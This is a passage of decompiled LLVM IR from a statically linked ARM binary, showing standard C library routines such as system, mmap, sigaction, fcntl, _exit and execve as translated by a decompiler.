  uselistorder i32 %v0_11970, { 1, 0, 2 }
  uselistorder i32 %v1_11954.pre, { 0, 2, 1 }
  uselistorder i32 %v0_118cc, { 1, 0, 2 }
  uselistorder i32 %v1_118b0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_11850, { 1, 0, 2 }
  uselistorder i32 %v1_11834.pre, { 0, 2, 1 }
  uselistorder i32 %v0_11790, { 1, 0, 2 }
  uselistorder i32 %v1_11774.pre, { 0, 2, 1 }
  uselistorder i32 %v2_11738, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-100, { 1, 0, 2 }
  uselistorder i32* %stack_var_-88, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 16, 15, 43, 17, 44, 45, 46, 47, 48, 49, 18, 20, 19, 2, 21, 22, 23, 24, 25, 26, 28, 27, 5, 29, 30, 31, 33, 32, 4, 34, 35, 36, 37, 38, 39, 41, 40, 1, 42 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 29, 30, 31, 32, 33, 0, 34, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 23, 24, 0, 25, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 7, 38, 39, 8, 9, 10, 12, 11, 0, 13, 14, 33, 34, 35, 36, 4, 37, 15, 16, 18, 17, 2, 19, 20, 22, 21, 3, 23, 24, 25, 27, 26, 1, 28, 29, 30, 31, 32, 40, 41 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 0, 2, 1 }
  uselistorder i32 -76340, { 1, 0, 2 }
  uselistorder i32 12980, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 7, 6, 5, 4, 3, 2, 9, 8, 1, 0 }
  uselistorder i32 13000, { 0, 3, 1, 4, 2, 5, 6, 7 }
  uselistorder i32 13004, { 1, 3, 8, 4, 9, 0, 6, 11, 2, 5, 10, 7, 12, 13, 14 }
  uselistorder label %dec_label_pc_11c2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11c00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11be8, { 1, 0 }
  uselistorder label %dec_label_pc_11bc8, { 1, 0 }
  uselistorder label %dec_label_pc_11bc0, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %dec_label_pc_11b50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11b38, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %dec_label_pc_11afc, { 1, 0 }
  uselistorder label %dec_label_pc_11ae8, { 1, 0 }
  uselistorder label %dec_label_pc_11974, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1195c, { 1, 0 }
  uselistorder label %dec_label_pc_1193c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11918, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_118d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_118b8, { 1, 0 }
  uselistorder label %dec_label_pc_11854, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1183c, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_11794, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1177c, { 1, 0 }
}

define i32 @function_11c3c(i16* %arg1) local_unnamed_addr {
dec_label_pc_11c3c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_11c3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11c3c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11c3c
  %v5_11c44 = udiv i32 %tmp, 32
  %v6_11c44 = and i32 %v5_11c44, %tmp
  %v2_11c48 = trunc i32 %v6_11c44 to i16
  store i16 %v2_11c48, i16* %arg1, align 2
  %v5_11c48 = load i32, i32* @r4, align 4
  %v6_11c48 = load i32, i32* %r0.global-to-local, align 4
  %v7_11c48 = sub i32 %v6_11c48, %v5_11c48
  store i32 %v7_11c48, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11c3c, %bb
  %v8_11c48 = phi i32 [ %tmp, %dec_label_pc_11c3c ], [ %v7_11c48, %bb ]
  ret i32 %v8_11c48

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_11c7c = load i32, i32* @r4, align 4
  %v6_11c7c = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_11c84 = icmp eq i32 %arg1, 0
  br i1 %v2_11c84, label %dec_label_pc_11c94, label %dec_label_pc_11cac

dec_label_pc_11c94:                               ; preds = %entry
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35696), i32* @r0, align 4
  %v0_11c9c = call i32 @do_system()
  %v1_11ca0 = sub i32 1, %v0_11c9c
  %v2_11ca0 = icmp ult i32 %v0_11c9c, 2
  br i1 %v2_11ca0, label %dec_label_pc_11ce4, label %bb

bb:                                               ; preds = %dec_label_pc_11c94
  br label %dec_label_pc_11ce4

dec_label_pc_11cac:                               ; preds = %entry
  %v4_11cb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_11cb4 = icmp eq i32 %v4_11cb0, 0
  br i1 %v2_11cb4, label %dec_label_pc_11cbc, label %dec_label_pc_11cc8

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11cac
  store i32 %v6_11c7c, i32* @r5, align 4
  %v0_11cc4 = call i32 @do_system()
  br label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cac, %dec_label_pc_11cbc
  %v0_11cc8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11cc8, i32* @r4, align 4
  %v0_11cd0 = load i32, i32* @r5, align 4
  store i32 %v0_11cd0, i32* @r0, align 4
  %v0_11cd4 = call i32 @do_system()
  store i32 %v0_11cd4, i32* @r5, align 4
  %v0_11cdc = load i32, i32* @r4, align 4
  %v1_11ce0 = call i32 @__libc_disable_asynccancel(i32 %v0_11cdc)
  %v0_11ce4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11ce4

dec_label_pc_11ce4:                               ; preds = %bb, %dec_label_pc_11c94, %dec_label_pc_11cc8
  %v0_11ce4 = phi i32 [ 0, %bb ], [ %v1_11ca0, %dec_label_pc_11c94 ], [ %v0_11ce4.pre, %dec_label_pc_11cc8 ]
  store i32 %v3_11c7c, i32* @r4, align 4
  store i32 %v6_11c7c, i32* @r5, align 4
  ret i32 %v0_11ce4

; uselistorder directives
  uselistorder i32 %v0_11c9c, { 1, 0 }
  uselistorder i32 %v6_11c7c, { 1, 0 }
  uselistorder i32 ()* @do_system, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11ce4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11cc8, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11d00 = load i32, i32* @r4, align 4
  store i32 %v3_11d00, i32* %stack_var_-16, align 4
  %v3_11d0c = urem i32 %arg5, 4096
  %v2_11d10 = icmp eq i32 %v3_11d0c, 0
  br i1 %v2_11d10, label %dec_label_pc_11d34, label %dec_label_pc_11d18

dec_label_pc_11d18:                               ; preds = %entry
  %v0_11d1c = call i32 @__aeabi_read_tp()
  store i32 %v0_11d1c, i32* %r0.global-to-local, align 4
  %v3_11d20 = load i16, i16* @global_var_24070.401, align 2
  %v4_11d20 = sext i16 %v3_11d20 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11d2c = add i32 %v4_11d20, %v0_11d1c
  %v4_11d2c = inttoptr i32 %v3_11d2c to i32*
  store i32 22, i32* %v4_11d2c, align 4
  %v0_11d68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11d68

dec_label_pc_11d34:                               ; preds = %entry
  %v0_11d44 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d44, -4095
  br i1 %tmp, label %dec_label_pc_11d64, label %dec_label_pc_11d4c

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d34
  %v1_11d50 = sub i32 0, %v0_11d44
  %v3_11d54 = load i16, i16* @global_var_24070.401, align 2
  %v4_11d54 = sext i16 %v3_11d54 to i32
  %v0_11d58 = call i32 @__aeabi_read_tp()
  %v3_11d5c = add i32 %v4_11d54, %v0_11d58
  %v4_11d5c = inttoptr i32 %v3_11d5c to i32*
  store i32 %v1_11d50, i32* %v4_11d5c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d34, %dec_label_pc_11d4c
  %v0_11d64 = phi i32 [ %v0_11d44, %dec_label_pc_11d34 ], [ -1, %dec_label_pc_11d4c ]
  store i32 %v0_11d64, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11d68

dec_label_pc_11d68:                               ; preds = %dec_label_pc_11d18, %dec_label_pc_11d64
  %v0_11d68 = phi i32 [ %v0_11d68.pre, %dec_label_pc_11d18 ], [ %v0_11d64, %dec_label_pc_11d64 ]
  store i32 %v0_11d68, i32* %r0.global-to-local, align 4
  %v2_11d6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11d6c, i32* @r4, align 4
  ret i32 %v0_11d68

; uselistorder directives
  uselistorder i32 %v0_11d68, { 1, 0 }
  uselistorder i32 %v0_11d44, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_11d68, { 1, 0 }
  uselistorder label %dec_label_pc_11d64, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_11d7c = load i32, i32* @lr, align 4
  store i32 %v0_11d7c, i32* %stack_var_-4, align 4
  %v0_11d84 = load i32, i32* @r0, align 4
  %v3_11d88 = load i16, i16* @global_var_24070.401, align 2
  %v4_11d88 = sext i16 %v3_11d88 to i32
  store i32 %v4_11d88, i32* @r2, align 4
  %v0_11d8c = call i32 @__aeabi_read_tp()
  %v1_11d90 = sub i32 0, %v0_11d84
  store i32 %v1_11d90, i32* @r3, align 4
  %v2_11d94 = load i32, i32* @r2, align 4
  %v3_11d94 = add i32 %v2_11d94, %v0_11d8c
  %v4_11d94 = inttoptr i32 %v3_11d94 to i32*
  store i32 %v1_11d90, i32* %v4_11d94, align 4
  %v2_11d9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_11d9c, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11da8 = load i32, i32* @r4, align 4
  %v6_11da8 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_11db0 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_11db0, label %dec_label_pc_11e04, label %dec_label_pc_11dc8

dec_label_pc_11dc8:                               ; preds = %entry
  %v1_11dc8 = add i32 %arg2, 4
  %v2_11dc8 = inttoptr i32 %v1_11dc8 to i32*
  %v3_11dc8 = load i32, i32* %v2_11dc8, align 4
  store i32 %v3_11dc8, i32* @r3, align 4
  %v1_11dcc = and i32 %v3_11dc8, 67108864
  %v2_11dcc = icmp eq i32 %v1_11dcc, 0
  br i1 %v2_11dcc, label %dec_label_pc_11dd4, label %dec_label_pc_11e04

dec_label_pc_11dd4:                               ; preds = %dec_label_pc_11dc8
  store i32 20, i32* @r2, align 4
  %v2_11dd8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11dd8, i32* @r0, align 4
  %v0_11ddc = call i32 @memcpy()
  store i32 %v2_11dd8, i32* @ip, align 4
  %v0_11e04.pre = load i32, i32* @r5, align 4
  %v0_11e0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11e04

dec_label_pc_11e04:                               ; preds = %dec_label_pc_11dc8, %entry, %dec_label_pc_11dd4
  %v0_11e0c = phi i32 [ %arg3, %dec_label_pc_11dc8 ], [ %arg3, %entry ], [ %v0_11e0c.pre, %dec_label_pc_11dd4 ]
  %v0_11e08 = phi i32 [ %arg2, %dec_label_pc_11dc8 ], [ 0, %entry ], [ %v2_11dd8, %dec_label_pc_11dd4 ]
  %v0_11e04 = phi i32 [ %arg1, %dec_label_pc_11dc8 ], [ %arg1, %entry ], [ %v0_11e04.pre, %dec_label_pc_11dd4 ]
  %v4_11e14 = call i32 @__syscall_rt_sigaction(i32 %v0_11e04, i32 %v0_11e08, i32 %v0_11e0c, i32 8)
  store i32 %v3_11da8, i32* @r4, align 4
  store i32 %v6_11da8, i32* @r5, align 4
  ret i32 %v4_11e14

; uselistorder directives
  uselistorder label %dec_label_pc_11e04, { 2, 0, 1 }
}

define i32 @function_11e28(i32 %arg1) local_unnamed_addr {
dec_label_pc_11e28:
  %v0_11e28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e28, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e28
  %v3_11e28 = mul i32 %arg1, %arg1
  %v2_11e2c = load i32, i32* @r4, align 4
  %v4_11e2c = mul i32 %v2_11e2c, 2
  %v5_11e2c = and i32 %v4_11e2c, %v3_11e28
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e28, %bb
  %v6_11e2c = phi i32 [ %arg1, %dec_label_pc_11e28 ], [ %v5_11e2c, %bb ]
  ret i32 %v6_11e2c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_11e34 = call i32 @__sigsetjmp()
  ret i32 %v0_11e34
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_11e4c = load i32, i32* @r0, align 4
  ret i32 %v0_11e4c
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_11e70 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_11e70, 2
  br i1 %tmp, label %dec_label_pc_11eac, label %dec_label_pc_11e88

dec_label_pc_11e88:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_11ee0, label %dec_label_pc_11e9c

dec_label_pc_11e9c:                               ; preds = %dec_label_pc_11e88
  %v0_11ea0 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_11ed4

dec_label_pc_11eac:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_11ec8, label %dec_label_pc_11ee0

dec_label_pc_11ec8:                               ; preds = %dec_label_pc_11eac
  %v0_11ecc = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11e9c, %dec_label_pc_11ec8
  %storemerge2 = phi i32 [ %v0_11ea0, %dec_label_pc_11e9c ], [ %v0_11ecc, %dec_label_pc_11ec8 ]
  %storemerge.in = load i16, i16* @global_var_24070.401, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_11ed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ed4 = sub i32 0, %v0_11ed4
  store i32 %v1_11ed4, i32* %r2.global-to-local, align 4
  %v3_11ed8 = add i32 %storemerge, %storemerge2
  %v4_11ed8 = inttoptr i32 %v3_11ed8 to i32*
  store i32 %v1_11ed4, i32* %v4_11ed8, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11ee0:                               ; preds = %dec_label_pc_11e88, %dec_label_pc_11eac, %dec_label_pc_11ed4
  %storemerge1 = phi i32 [ -1, %dec_label_pc_11ed4 ], [ %arg1, %dec_label_pc_11eac ], [ %arg1, %dec_label_pc_11e88 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_11ee0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11ed4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_11ef8 = load i32, i32* @r2, align 4
  %v3_11efc = load i32, i32* @r4, align 4
  store i32 %v3_11efc, i32* %stack_var_-32, align 4
  %v6_11efc = load i32, i32* @r5, align 4
  %v12_11efc = load i32, i32* @r7, align 4
  %v4_11f0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_11f18 = icmp eq i32 %v4_11f0c, 0
  %v0_11f20 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f20, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_11ef8, i32* @r4, align 4
  br i1 %v2_11f18, label %dec_label_pc_11f3c, label %dec_label_pc_11f30

dec_label_pc_11f30:                               ; preds = %entry
  %v7_11f30 = icmp eq i32 %arg2, 7
  br i1 %v7_11f30, label %dec_label_pc_11f7c, label %bb

bb:                                               ; preds = %dec_label_pc_11f30
  %v8_11f34 = icmp eq i32 %arg2, 14
  br i1 %v8_11f34, label %dec_label_pc_11f7c, label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_11f20, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_11f20, -4095
  br i1 %tmp, label %dec_label_pc_11f74, label %dec_label_pc_11f5c

dec_label_pc_11f5c:                               ; preds = %dec_label_pc_11f3c
  %v0_11f60 = call i32 @__aeabi_read_tp()
  %v3_11f64 = load i16, i16* @global_var_24070.401, align 2
  %v4_11f64 = sext i16 %v3_11f64 to i32
  %v0_11f68 = load i32, i32* @r2, align 4
  %v1_11f68 = sub i32 0, %v0_11f68
  store i32 %v1_11f68, i32* @r2, align 4
  %v3_11f6c = add i32 %v4_11f64, %v0_11f60
  %v4_11f6c = inttoptr i32 %v3_11f6c to i32*
  store i32 %v1_11f68, i32* %v4_11f6c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f74

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11f3c, %dec_label_pc_11f5c
  %v0_11f74 = phi i32 [ %v0_11f20, %dec_label_pc_11f3c ], [ -1, %dec_label_pc_11f5c ]
  br label %dec_label_pc_11fc8

dec_label_pc_11f7c:                               ; preds = %dec_label_pc_11f30, %bb
  %v0_11f7c = call i32 @__libc_enable_asynccancel()
  %v0_11f80 = load i32, i32* @r7, align 4
  store i32 %v0_11f80, i32* @r1, align 4
  store i32 %v0_11f7c, i32* %r6.global-to-local, align 4
  %v0_11f8c = load i32, i32* @r5, align 4
  store i32 %v0_11f8c, i32* %r0.global-to-local, align 4
  store i32 %v0_11f8c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_11f8c, -4095
  br i1 %tmp15, label %dec_label_pc_11fbc, label %dec_label_pc_11fa4

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f7c
  %v1_11fa8 = sub i32 0, %v0_11f8c
  %v0_11fac = call i32 @__aeabi_read_tp()
  store i32 %v0_11fac, i32* %r0.global-to-local, align 4
  %v3_11fb0 = load i16, i16* @global_var_24070.401, align 2
  %v4_11fb0 = sext i16 %v3_11fb0 to i32
  %v3_11fb4 = add i32 %v4_11fb0, %v0_11fac
  %v4_11fb4 = inttoptr i32 %v3_11fb4 to i32*
  store i32 %v1_11fa8, i32* %v4_11fb4, align 4
  store i32 -1, i32* @r2, align 4
  %v0_11fbc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11fbc

dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11f7c, %dec_label_pc_11fa4
  %v0_11fc0 = phi i32 [ %v0_11f8c, %dec_label_pc_11f7c ], [ -1, %dec_label_pc_11fa4 ]
  %v0_11fbc = phi i32 [ %v0_11f7c, %dec_label_pc_11f7c ], [ %v0_11fbc.pre, %dec_label_pc_11fa4 ]
  store i32 %v0_11fbc, i32* %r0.global-to-local, align 4
  store i32 %v0_11fc0, i32* @r7, align 4
  %v1_11fc4 = call i32 @__libc_disable_asynccancel(i32 %v0_11fbc)
  store i32 %v1_11fc4, i32* %r0.global-to-local, align 4
  %v0_11fc8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %dec_label_pc_11f74, %dec_label_pc_11fbc
  %v0_11fc8 = phi i32 [ %v0_11f74, %dec_label_pc_11f74 ], [ %v0_11fc8.pre, %dec_label_pc_11fbc ]
  store i32 %v0_11fc8, i32* %r0.global-to-local, align 4
  %v2_11fd0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11fd0, i32* @r4, align 4
  store i32 %v6_11efc, i32* @r5, align 4
  store i32 %v12_11efc, i32* @r7, align 4
  ret i32 %v0_11fc8

; uselistorder directives
  uselistorder i32 %v0_11fc8, { 1, 0 }
  uselistorder i32 %v0_11fbc, { 1, 0 }
  uselistorder i32 %v0_11f8c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11f20, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11fc8, { 1, 0 }
  uselistorder label %dec_label_pc_11fbc, { 1, 0 }
  uselistorder label %dec_label_pc_11f7c, { 1, 0 }
  uselistorder label %dec_label_pc_11f74, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11fec = load i32, i32* @r7, align 4
  store i32 %v3_11fec, i32* %stack_var_-8, align 4
  %v0_11ff8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ff8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ff8, -4095
  br i1 %tmp, label %dec_label_pc_12020, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %entry
  %v0_1200c = call i32 @__aeabi_read_tp()
  %v3_12010 = load i16, i16* @global_var_24070.401, align 2
  %v4_12010 = sext i16 %v3_12010 to i32
  %v0_12014 = load i32, i32* %r2.global-to-local, align 4
  %v1_12014 = sub i32 0, %v0_12014
  store i32 %v1_12014, i32* %r2.global-to-local, align 4
  %v3_12018 = add i32 %v4_12010, %v0_1200c
  %v4_12018 = inttoptr i32 %v3_12018 to i32*
  store i32 %v1_12014, i32* %v4_12018, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12020.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %entry, %dec_label_pc_12008
  %v1_12024 = phi i32 [ %v0_11ff8, %entry ], [ -1, %dec_label_pc_12008 ]
  %v2_12020 = phi i32 [ %v3_11fec, %entry ], [ %v2_12020.pre, %dec_label_pc_12008 ]
  store i32 %v2_12020, i32* @r7, align 4
  ret i32 %v1_12024

; uselistorder directives
  uselistorder i32 %v0_11ff8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12020, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12038

dec_label_pc_12038:                               ; preds = %dec_label_pc_12064, %dec_label_pc_12078, %entry
  %v0_12038 = phi i32 [ %arg1, %entry ], [ %v0_12038.pre.pre, %dec_label_pc_12078 ], [ %v0_12064, %dec_label_pc_12064 ]
  store i32 %v0_12038, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12038, -4095
  br i1 %tmp, label %dec_label_pc_12064, label %dec_label_pc_12054

dec_label_pc_12054:                               ; preds = %dec_label_pc_12038
  %v0_12054 = call i32 @__aeabi_read_tp()
  %v0_12058 = load i32, i32* %r2.global-to-local, align 4
  %v1_12058 = sub i32 0, %v0_12058
  store i32 %v1_12058, i32* %r2.global-to-local, align 4
  %v3_1205c = load i16, i16* @global_var_24070.401, align 2
  %v4_1205c = sext i16 %v3_1205c to i32
  %v3_12060 = add i32 %v4_1205c, %v0_12054
  %v4_12060 = inttoptr i32 %v3_12060 to i32*
  store i32 %v1_12058, i32* %v4_12060, align 4
  %v0_12064.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12064

dec_label_pc_12064:                               ; preds = %dec_label_pc_12038, %dec_label_pc_12054
  %v0_12064 = phi i32 [ %v0_12038, %dec_label_pc_12038 ], [ %v0_12064.pre, %dec_label_pc_12054 ]
  store i32 %v0_12064, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_12064, -4095
  br i1 %tmp4, label %dec_label_pc_12038, label %dec_label_pc_12078

dec_label_pc_12078:                               ; preds = %dec_label_pc_12064
  %v0_12078 = call i32 @__aeabi_read_tp()
  %v0_1207c = load i32, i32* %r2.global-to-local, align 4
  %v1_1207c = sub i32 0, %v0_1207c
  store i32 %v1_1207c, i32* %r2.global-to-local, align 4
  %v3_12080 = load i16, i16* @global_var_24070.401, align 2
  %v4_12080 = sext i16 %v3_12080 to i32
  %v3_12084 = add i32 %v4_12080, %v0_12078
  %v4_12084 = inttoptr i32 %v3_12084 to i32*
  store i32 %v1_1207c, i32* %v4_12084, align 4
  %v0_12038.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12038

; uselistorder directives
  uselistorder i32 %v0_12064, { 0, 2, 1 }
  uselistorder i32 %v0_12038, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_12064, { 1, 0 }
  uselistorder label %dec_label_pc_12038, { 1, 0, 2 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_120c8, label %dec_label_pc_120b0

dec_label_pc_120b0:                               ; preds = %entry
  %v0_120b4 = call i32 @__aeabi_read_tp()
  %v3_120b8 = load i16, i16* @global_var_24070.401, align 2
  %v4_120b8 = sext i16 %v3_120b8 to i32
  %v0_120bc = load i32, i32* %r2.global-to-local, align 4
  %v1_120bc = sub i32 0, %v0_120bc
  store i32 %v1_120bc, i32* %r2.global-to-local, align 4
  %v3_120c0 = add i32 %v4_120b8, %v0_120b4
  %v4_120c0 = inttoptr i32 %v3_120c0 to i32*
  store i32 %v1_120bc, i32* %v4_120c0, align 4
  br label %dec_label_pc_120c8

dec_label_pc_120c8:                               ; preds = %entry, %dec_label_pc_120b0
  %v1_120cc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_120b0 ]
  ret i32 %v1_120cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_120c8, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
